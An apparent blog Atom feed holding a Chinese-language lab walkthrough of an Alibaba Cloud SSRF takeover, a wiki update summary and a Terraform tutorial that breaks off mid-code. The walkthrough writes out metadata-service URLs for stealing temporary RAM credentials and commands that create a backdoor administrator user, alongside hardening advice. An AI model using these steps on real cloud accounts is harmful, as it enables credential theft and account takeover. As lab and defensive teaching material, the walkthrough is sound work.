<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TeamsSix</title>
  
  
  <link href="https://www.teamssix.com/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2022-06-07T04:09:32.378Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>TeamsSix</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从云服务器 SSRF 漏洞到接管你的阿里云控制台</title>
    <link href="https://www.teamssix.com/220607-115953.html"/>
    <id>https://www.teamssix.com/220607-115953.html</id>
    <published>2022-06-07T03:59:53.000Z</published>
    <updated>2022-06-07T04:09:32.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p> 本文将以阿里云为例，对云服务中的一些攻防手法进行演示，首先利用 Terraform 进行 ECS SSRF 漏洞环境的搭建，然后通过实例中存在的 SSRF 漏洞一步步拿下该云服务账户的所有的阿里云服务权限。</p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>本文采用 TerraformGoat 进行靶场的搭建，Terraform 靶场地址：<a href="https://github.com/HuoCorp/TerraformGoat">https://github.com/HuoCorp/TerraformGoat</a></p><p>在部署靶场时，需要用到你的阿里云 AccessKey，为了避免影响到你的云上生产环境，因此这里强烈建议使用非生产环境的 AccessKey，不要和生产环境使用同一个账号。</p><p>接下来开始搭建靶场，首先克隆靶场项目到本地，并构建下载靶场所需的依赖。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/HuoCorp/TerraformGoat.git --depth <span class="token number">1</span><span class="token builtin class-name">cd</span> TerraformGoatdocker build <span class="token builtin class-name">.</span> -t terraformgoat:v0.0.3docker run -itd --name terraformgoat terraformgoat:v0.0.3docker <span class="token builtin class-name">exec</span> -it terraformgoat /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果 github 访问较慢，可以给终端挂上代理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">proxy_url</span><span class="token operator">=</span><span class="token string">"127.0.0.1:1080"</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">export</span> <span class="token assign-left variable">https_proxy</span><span class="token operator">=</span>http://<span class="token variable">$proxy_url</span> <span class="token assign-left variable">http_proxy</span><span class="token operator">=</span>http://<span class="token variable">$proxy_url</span> <span class="token assign-left variable">all_proxy</span><span class="token operator">=</span>socks5://<span class="token variable">$proxy_url</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在进入容器后，容器会提示选择接下来要使用的云服务提供商，这里以阿里云服务为例，输入 2 选择阿里云后回车。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071202435.png"></p><p>进入到阿里云 ECS SSRF 靶场路径下，并配置你的 AccessKey</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /TerraformGoat/aliyun/ecs/ecs_ssrf/aliyun configure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071203624.png"></p><p>部署 SSRF 靶场</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">terraform initterraform apply<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 init 初始化比较慢，挂上代理即可</p><p>在 apply 期间，会提示 Enter a value，这时输入 yes 回车即可。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071203355.png"></p><p>在 Outputs 处，可以看到返回的靶场地址，访问这个地址，可以看到 SSRF 测试靶场页面，这时就说明环境搭建完了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071203688.png"></p><h2 id="0x02-环境利用"><a href="#0x02-环境利用" class="headerlink" title="0x02 环境利用"></a>0x02 环境利用</h2><p>当前环境存在 SSRF 漏洞，但和常规 SSRF 所处的环境不同，这里的 SSRF 漏洞是出现在云服务器上的，这也就意味着我们可以通过这个 SSRF 漏洞获取到该服务器的元数据信息。</p><p>访问元数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://100.100.100.200/latest/meta-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071204895.png"></p><p>在返回的结果中，可以看到当前环境存在 ram/ 目录，这也就意味着当前云服务器配置了 RAM 角色，这样我们可以获取到临时凭证了。</p><p>通过元数据获取临时凭证</p><blockquote><p>这里 URL 中的 huocorp-terraform-goat-role 是 RAM 角色名称，可以通过访问 <a href="http://100.100.100.200/latest/meta-data/ram/security-credentials/">http://100.100.100.200/latest/meta-data/ram/security-credentials/</a> 获取到。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071204154.png"></p><p>将临时凭证配置到 aliyun 命令行工具里。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aliyun configure --mode StsToken<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071204853.png"></p><p>创建子用户，并赋予管理员权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aliyun <span class="token function">ram</span> CreateUser --UserName teamssixaliyun <span class="token function">ram</span> CreateLoginProfile --UserName teamssix --Password TeamsSix@666aliyun <span class="token function">ram</span> AttachPolicyToUser --PolicyType System --PolicyName AdministratorAccess --UserName teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071205011.png"></p><p>访问 <a href="https://signin.aliyun.com/">https://signin.aliyun.com</a> 页面，通过 RAM 用户进行登录，这里的用户格式为 username@company-alias，其中 username 就是刚刚创建的用户名，company-alias 可以通过下面的这个命令获取到。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aliyun <span class="token function">ram</span> GetAccountAlias<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071205370.png"></p><p>这里的 AccountAlias 就是我们需要的 company-alias，接下来就可以登录控制台了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071205606.png"></p><p>输入刚才创建用户时的密码</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071205770.png"></p><p>登录后，就可以看到目标的控制台了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071206236.png"></p><p>由于刚才在创建用户时，赋予了 AdministratorAccess 权限，因此在 RAM 访问控制处可以看到，当前账号拥有管理所有阿里云资源的权限。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071206186.png"></p><p>在云服务 ECS 实例中也可以看到我们刚才搭建的那台 SSRF 靶场服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071206187.png"></p><p>至此，就实现了利用云服务器上的 SSRF 漏洞接管了阿里云控制台。</p><blockquote><p>另外这个环境里还放了一个 flag 文件，你如果感兴趣的话，可以动手去尝试找到这个 flag，Writeup 地址：<a href="https://github.com/HuoCorp/TerraformGoat/tree/main/aliyun/ecs/ecs_ssrf">https://github.com/HuoCorp/TerraformGoat/tree/main/aliyun/ecs/ecs_ssrf</a></p></blockquote><h2 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03 防御措施"></a>0x03 防御措施</h2><p>这个环境的问题除了存在 SSRF 外，还有另外两个主要的问题：</p><ol><li>RAM 角色权限过大，导致可以通过该角色的权限进行创建子用户以及给子用户授予高权限等操作</li><li>元数据未做加固访问，导致一旦目标存在 SSRF 或目标权限被拿下，元数据就存在被获取的风险</li></ol><p>那么针对第一个 RAM 角色权限过大的问题，主要还是需要使用者严格遵守权限最小化的原则，在为 RAM 角色赋予权限时，避免赋予过高的权限，只赋予自己所需要的权限，这样可以将影响程度降到最低，但是这并不能治本。</p><p>针对第二个元数据未做加固访问的问题，可以将实例上的元数据访问模式设置为加固模式，这是一种治本的方法，将元数据访问模式设置为加固模式有以下两种方法：</p><ol><li>在创建实例时，可以在「系统配置」的「高级选项」中将「实例元数据访问模式」设置为「仅加固模式」</li></ol><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071207226.png"></p><ol start="2"><li>在已经创建好的实例中，可以在阿里云 OpenAPI 中开启元数据强制使用 Token 访问，OpenAPI 地址：<a href="https://next.api.aliyun.com/api/Ecs/2014-05-26/ModifyInstanceMetadataOptions">https://next.api.aliyun.com/api/Ecs/2014-05-26/ModifyInstanceMetadataOptions</a></li></ol><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071207152.png"></p><p>将 HttpTokens 设置为 required 即表示强制使用加固模式，此时再访问元数据就会提示 403 了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071207518.png"></p><p>值得一提的是，将元数据设置为加固模式可以防止通过 SSRF 获取到元数据，但如果实例权限被拿下，那么红队还是可以通过在实例上执行获取 token 的命令，然后利用该 token 获取到元数据。</p><p>在 Linux 实例中获取 token 的命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">TOKEN</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">curl</span> -X PUT <span class="token string">"http://100.100.100.200/latest/api/token"</span> -H <span class="token string">"X-aliyun-ecs-metadata-token-ttl-seconds: 21600"</span><span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过 token 获取元数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -H <span class="token string">"X-aliyun-ecs-metadata-token: <span class="token variable">$TOKEN</span>"</span>  http://100.100.100.200/latest/meta-data/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071208116.png"></p><p>对于 Windows 实例下的获取方法可以参考阿里云官方文档：<a href="https://help.aliyun.com/document_detail/108460.htm">https://help.aliyun.com/document_detail/108460.htm</a></p><blockquote><p>将元数据访问模式设置为加固模式进而防御 SSRF 漏洞的这个方法由 2h0ng 师傅提供</p></blockquote><h2 id="0x04-环境删除"><a href="#0x04-环境删除" class="headerlink" title="0x04 环境删除"></a>0x04 环境删除</h2><p>删除创建的子账号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aliyun <span class="token function">ram</span> DetachPolicyFromUser --PolicyType System --PolicyName AdministratorAccess --UserName teamssixaliyun <span class="token function">ram</span> DeleteUser --UserName teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>删除 SSRF 靶场环境，在使用完靶场后，记得及时删除，因为这里创建的云服务是按时间计费的，该靶场实例的价格为每小时 0.17 元人民币。</p><blockquote><p>在销毁靶场之前，记得把 AccessKey 配置成最开始的 AccessKey，配置命令：aliyun configure –mode AK</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">terraform destroy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想清除 TerraformGoat，可以使用以下命令，如果以后还想进行云上攻防的学习，则可以将 TerraformGoat 环境保留下来。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker stop terraformgoatdocker <span class="token function">rm</span> terraformgoatdocker rmi terraformgoat:v0.0.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>这里通过云上 SSRF 漏洞获取到了临时密钥，通过临时秘钥创建了一个具有管理员访问权限的子用户，最后通过这个子用户接管了目标的控制台。</p><p>但是这个方法在实战中想要使用是有一些前提的，主要前提有以下两个：</p><ol><li>ECS 实例需要被授予 RAM 角色，不然访问临时凭证的元数据会返回 404</li><li>RAM 角色需要具备 ram 访问控制的相关操作权限，例如创建用户、赋予权限等，不然临时秘钥会没有创建子用户的权限。</li></ol><blockquote><p>在实战中，如果遇到了 ECS 实例被授予了 RAM 角色的情况，大多时候该角色都是不具备创建用户权限的，这时就没法通过创建子账号登录控制台的方式了，只能通过阿里云命令行工具去操作目标云服务了。</p></blockquote><p>总的来说，云上攻防和常规的内网攻防还是十分不一样的。</p><ul><li>云上攻防的常见问题是配置错误，例如这里的问题就是 RAM 角色配置权限过高。</li><li>云上攻防的权限维持主要方法是创建 RAM 高权限用户，而不是像传统攻防里那样有五花八门的权限维持方法。</li><li>云上攻防的内网横向主要是在云服务厂商命令行或者控制台中进行横向，从这个云服务横向到另一个云服务，而不是像传统攻防那样有各种各样的内网横向手法。</li><li>……</li></ul><p>最后，本文中所提到的很多命令都是参考火线云安全知识库中的内容，知识库地址：<a href="https://cloudsec.huoxian.cn/">https://cloudsec.huoxian.cn</a>，在知识库的首页中可以看到火线云服务攻防矩阵，本文就是依据这个攻防矩阵进行的云上攻防。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071208077.png"></p><p>如果你还想找到更多云安全资源进行学习，可以访问 Awesome Cloud Security 项目，该项目当前已经收录了上百余条国内外云安全博客、工具、公众号等资源，项目地址：<a href="https://github.com/teamssix/awesome-cloud-security">https://github.com/teamssix/awesome-cloud-security</a></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202206071208223.png"></p><blockquote><p>参考文章：<a href="https://cloudsec.huoxian.cn/docs/matrix/aliyun/aliyun_ecs">https://cloudsec.huoxian.cn/docs/matrix/aliyun/aliyun_ecs</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152148071.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt; 本文将以阿里云为例，对云服务中的一些攻防手法进行演示，首先利用 Terraform 进行 ECS </summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="Terraform" scheme="https://www.teamssix.com/tags/Terraform/"/>
    
    <category term="SSRF" scheme="https://www.teamssix.com/tags/SSRF/"/>
    
    <category term="阿里云" scheme="https://www.teamssix.com/tags/%E9%98%BF%E9%87%8C%E4%BA%91/"/>
    
  </entry>
  
  <entry>
    <title>T Wiki 云安全知识库 5 月份更新汇总</title>
    <link href="https://www.teamssix.com/220531-121945.html"/>
    <id>https://www.teamssix.com/220531-121945.html</id>
    <published>2022-05-31T04:19:45.000Z</published>
    <updated>2022-05-31T04:38:53.427Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>T Wiki 在 4 月 16 日上线，5 月份以来依然收到不少师傅的支持与反馈，此时正好到月末，特此整理下这段时间来 T Wiki 上所更新的内容，如果你还不知道 T Wiki 是什么，可以查看这篇文章<a href="https://teamssix.com/220415-210629.html">T Wiki 云安全知识文库上线</a>，或者访问 T Wiki 地址： <a href="https://wiki.teamssix.com/Changelog/">wiki.teamssix.com</a></p><h2 id="感谢你们"><a href="#感谢你们" class="headerlink" title="感谢你们"></a>感谢你们</h2><p>自 5 月 1 日至 5 月 31 日，T Wiki 总共收到了 4 位师傅的补充，分别为 m4d3bug、Idle Life、da Vinci【达文西】、tanger</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202205311237409.png"></p><h3 id="云安全资源板块补充内容"><a href="#云安全资源板块补充内容" class="headerlink" title="云安全资源板块补充内容"></a>云安全资源板块补充内容</h3><p><strong>m4d3bug</strong></p><ul><li>k8s 安全风险检测工具 StackRox</li></ul><p><strong>Idle Life</strong></p><ul><li>开源云原生安全防护平台 neuvector</li></ul><p><strong>da Vinci【达文西】</strong></p><ul><li>云安全态势管理工具 CloudSploit</li><li>Azure 红队利用工具 Stormspotter</li><li>GCP IAM 权限提升方法 GCP-IAM-Privilege-Escalation</li></ul><p><strong>tanger</strong></p><ul><li>腾讯云轻量服务器管理工具</li></ul><p><strong>TeamsSix</strong></p><ul><li>云服务安全漏洞汇总</li><li>基于终端 UI 的 k8s 集群管理工具 k9s</li><li>从零开始的 Kubernetes 攻防</li><li>初探 eBPF</li><li>KubeCon + CloudNativeCon Europe 2022 相关视频</li><li>CNCF 云原生安全白皮书 v2</li><li>云上攻防：RED TEAMING FOR CLOUD</li><li>云上攻防二三事（续）</li><li>AWS 控制台接管利用工具 aws_consoler</li><li>云上公开资产枚举 CloudBrute</li><li>k8s 调试辅助工具 validkube</li><li>Bridgecrew Blog（英文）</li><li>浅析K8S各种未授权攻击方法</li><li>Trend Micro Blog（英文）</li><li>企业迁移到公有云之前要问的5个问题</li><li>在 AWS 下查看自己所拥有的权限</li><li>APISIX CVE-2022-29266 漏洞分析与复现</li><li>保障云和容器安全的十个注意事项（英文）</li><li>Rhino Security Labs Blog（英文）</li><li>火线云安全知识库</li><li>多云靶场搭建工具 TerraformGoat</li><li>Cloud Security Wiki（英文）</li><li>火线云安全沙龙视频</li><li>《Hacking Kubernetes》</li></ul><h3 id="文章更新内容"><a href="#文章更新内容" class="headerlink" title="文章更新内容"></a>文章更新内容</h3><p>《Terraform 使用入门以及在云上攻防中的作用》</p><p>《S3 任意文件上传》</p><p>《Bucket Object 遍历》</p><p>《RDS 信息收集》</p><p>《MSSQL 读取实例信息》</p><p>《PostgreSQL 数据库 SSRF》</p><p>《利用 IAM 进行权限提升》</p><p>《利用 IAM 进行权限维持》</p><p>《在 AWS 下查看自己所拥有的权限》</p><h2 id="Awesome-Cloud-Security"><a href="#Awesome-Cloud-Security" class="headerlink" title="Awesome Cloud Security"></a>Awesome Cloud Security</h2><p>Awesome Cloud Security 项目是一个云安全资源汇总的项目，这个项目内容会和 T Wiki 云安全资源板块同步更新，Awesome Cloud Security 项目地址：<a href="https://github.com/teamssix/awesome-cloud-security">github.com/teamssix/awesome-cloud-security</a></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202205311237341.png"></p><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152148071.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;T Wiki 在 4 月 16 日上线，5 月份以来依然收到不少师傅的支持与反馈，此时正好到月末，特此整理下这段时间来 T Wiki 上所更</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="知识文库" scheme="https://www.teamssix.com/tags/%E7%9F%A5%E8%AF%86%E6%96%87%E5%BA%93/"/>
    
    <category term="更新汇总" scheme="https://www.teamssix.com/tags/%E6%9B%B4%E6%96%B0%E6%B1%87%E6%80%BB/"/>
    
  </entry>
  
  <entry>
    <title>Terraform 使用入门以及在云上攻防中的作用</title>
    <link href="https://www.teamssix.com/220530-165026.html"/>
    <id>https://www.teamssix.com/220530-165026.html</id>
    <published>2022-05-30T08:50:26.000Z</published>
    <updated>2022-05-30T09:11:46.234Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Terraform 是一种资源编排工具，通过它可以很方便的去构建云服务资源，本文将以「在腾讯云上创建一个 COS 存储桶」为例进行演示。</p><h2 id="0x01-Terraform-概述"><a href="#0x01-Terraform-概述" class="headerlink" title="0x01 Terraform 概述"></a>0x01 Terraform 概述</h2><p>Terraform 官方下载页面：<a href="https://www.terraform.io/downloads">terraform.io/downloads</a> ，在这里找到自己的系统进行安装即可。</p><p>目前 Terraform 基本已经支持了大部分主流的云服务厂商，在 <a href="https://registry.terraform.io/browse/providers">registry.terraform.io/browse/providers</a> 中可以看到其所支持的云服务厂商。</p><p>本文中将使用腾讯云作为演示，在平时使用 Terraform 时会频繁的去参考官方文档，其腾讯云的官方文档地址为：<a href="https://registry.terraform.io/providers/tencentcloudstack/tencentcloud/latest/docs">registry.terraform.io/providers/tencentcloudstack/tencentcloud/latest/docs</a></p><h2 id="0x02-开始编写"><a href="#0x02-开始编写" class="headerlink" title="0x02 开始编写"></a>0x02 开始编写</h2><p>首先创建一个文件夹（这里文件夹名称为 cos_bucket_demo），并新建以下文件。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.└── cos_bucket_demo    ├── README.md    ├── main.tf    ├── output.tf    ├── terraform.tfvars    ├── variables.tf    └── version.tf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>README.md    描述文件</li><li>main.tf    Terraform 主体代码文件</li><li>output.tf    内容输出代码文件</li><li>terraform.tfvars    参数文件</li><li>variables.tf    变量声明文件</li><li>version.tf    版本信息文件</li></ul><p>可以看到在 cos_bucket_demo 文件夹中，有多个 tf 后缀的文件，其实这些 tf 文件里的代码都可以写到一个 tf 文件里，但一般为了规范些，还是建议分多个 tf 文件去写，一个文件夹对应一个 tf 场景。</p><p>接下来，我们来看看每个 tf 文件里都有哪些内容。</p><h3 id="version-tf"><a href="#version-tf" class="headerlink" title="version.tf"></a>version.tf</h3><p>version.tf 一般是放和版本信息有关的代码，例如这里就是声明了 Provider 来源为 tencentcloud 且版本为 1.72.5，Provider 在这里可以理解成「提供云服务的厂商」的意思。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">terraform <span class="token punctuation">&#123;</span>  required_providers <span class="token punctuation">&#123;</span>    tencentcloud = <span class="token punctuation">&#123;</span>      source  = <span class="token string">"tencentcloudstack/tencentcloud"</span>      version = <span class="token string">"1.72.5"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果经常使用某个云的 Provider，建议指定固定的版本，这样在开启插件缓存后，每次初始化 Terraform 时，就不会因为 Provider 有更新了而要重新下载它，同时还会避免因为  Provider 更新导致代码不可用或者出现告警的情况。</p><p>开启插件缓存方法可以参考：<a href="https://wiki.teamssix.com/CloudNative/Terraform/terraform-enable-plugin-cache.html">wiki.teamssix.com/CloudNative/Terraform/terraform-enable-plugin-cache.html</a></p><h3 id="variables-tf"><a href="#variables-tf" class="headerlink" title="variables.tf"></a>variables.tf</h3><p>variables.tf 里一般会写上变量的声明，例如这里需要声明腾讯云的 secret id 和 secret key 变量。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">variable <span class="token string">"tencentcloud_secret_id"</span> <span class="token punctuation">&#123;</span>  type        = string  description = <span class="token string">"Set Tencent Cloud secret id."</span>  sensitive   = <span class="token boolean">true</span>  nullable    = <span class="token boolean">false</span><span class="token punctuation">&#125;</span>variable <span class="token string">"tencentcloud_secret_key"</span> <span class="token punctuation">&#123;</span>  type        = string  description = <span class="token string">"Set Tencent Cloud secret key."</span>  sensitive   = <span class="token boolean">true</span>  nullable    = <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 variable 后面的是变量名称，type 指定变量类型，description 用来描述变量的用途，sensitive 用来指定变量是不是敏感信息，nullable 用来指定变量是不是可以为空。</p><h3 id="terraform-tfvars"><a href="#terraform-tfvars" class="headerlink" title="terraform.tfvars"></a>terraform.tfvars</h3><p>terraform.tfvars 文件比较简单，在这里可以写上变量的值，这样在运行 Terraform 的时候，就不用从命令行中去指定变量了。</p><p>如果没有该文件，那么在执行 Terraform 代码时，Terraform 就会在命令行中提示输入这些变量。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">tencentcloud_secret_id  = <span class="token string">"xxx"</span>tencentcloud_secret_key = <span class="token string">"xxx"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="output-tf"><a href="#output-tf" class="headerlink" title="output.tf"></a>output.tf</h3><p>output.tf 文件里一般会指定要输出的内容，这里要输出的是 COS Bucket 的地址。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">output <span class="token string">"tencent_cloud_cos_bucket_name"</span> <span class="token punctuation">&#123;</span>  value       = <span class="token string">"https://$&#123;tencentcloud_cos_bucket.cos_bucket_demo.cos_bucket_url&#125;"</span>  description = <span class="token string">"This is the bucket name of Tencent Cloud COS."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="main-tf"><a href="#main-tf" class="headerlink" title="main.tf"></a>main.tf</h3><p>最后 main.tf 一个就是最核心的文件了。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">provider <span class="token string">"tencentcloud"</span> <span class="token punctuation">&#123;</span>  secret_id  = var.tencentcloud_secret_id  secret_key = var.tencentcloud_secret_key  region     = <span class="token string">"ap-beijing"</span><span class="token punctuation">&#125;</span>resource <span class="token string">"tencentcloud_cos_bucket"</span> <span class="token string">"cos_bucket_demo"</span> <span class="token punctuation">&#123;</span>  bucket = <span class="token string">"teamssix-$&#123;random_string.random_suffix.result&#125;-$&#123;data.tencentcloud_user_info.foo.app_id&#125;"</span><span class="token punctuation">&#125;</span>resource <span class="token string">"random_string"</span> <span class="token string">"random_suffix"</span> <span class="token punctuation">&#123;</span>  length  = <span class="token number">7</span>  special = <span class="token boolean">false</span>  upper   = <span class="token boolean">false</span><span class="token punctuation">&#125;</span>data <span class="token string">"tencentcloud_user_info"</span> <span class="token string">"foo"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先在 provider 块中指定了腾讯云的 secret id 和 secret key 以及 region，接着使用 tencentcloud_cos_bucket resource 块用来创建存储桶。</p><p>由于腾讯云的 Bucket 名称中包含了使用者的 APP ID，所以这里还使用了 tencentcloud_user_info data 块，用来获取当前用户的 APP ID，同时为了避免 Bucket 名称重复，这里使用了 random_string resource 块用来生成一个随机数。</p><p>最后，就可以执行这些代码了。</p><h2 id="0x03-执行代码"><a href="#0x03-执行代码" class="headerlink" title="0x03 执行代码"></a>0x03 执行代码</h2><p>首先，将终端路径切到 cos_bucket_demo 文件夹下，运行初始化命令。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">terraform init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该命令会识别当前文件夹里的 tf 文件中所使用到的 Provider，然后去下载它。</p><p>如果提示 Error: Failed to install provider，大多数情况是因为网络的问题，可以在终端里设置代理后再次尝试。</p><p>然后运行以下命令，该命令会检查当前代码是否存在问题，如果没问题就会给出接下来将要执行的计划。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">terraform plan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后，确认没问题后，就可以应用这个代码了。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">terraform apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在执行该命令的时候，会提示 Enter a value，这时如果确认无误，就输入 yes 即可，最后就可以在 Outputs 中看到 Bucket 的 URL 了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202205301707311.png"></p><p>这时，在腾讯云控制台的存储桶列表中，就可以看到我们刚才创建的存储桶了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202205301708483.png"></p><p>这样，我们就完成了利用 Terraform 创建云服务资源的过程，如果想要销毁这个资源也很容易，直接运行以下命令即可。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">terraform destroy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x04-在云上攻防中的作用"><a href="#0x04-在云上攻防中的作用" class="headerlink" title="0x04 在云上攻防中的作用"></a>0x04 在云上攻防中的作用</h2><p>通过上面的内容，可以看到 Terraform 可以调用云厂商的 AK、SK 进行云服务资源的创建与获取，作为安全人员，我们可以利用这个特性进行云上服务的批量信息收集，下面以 COS、CVM、CAM 的信息收集为例。</p><p>将 output.tf 改为以下内容</p><pre class="line-numbers language-json" data-language="json"><code 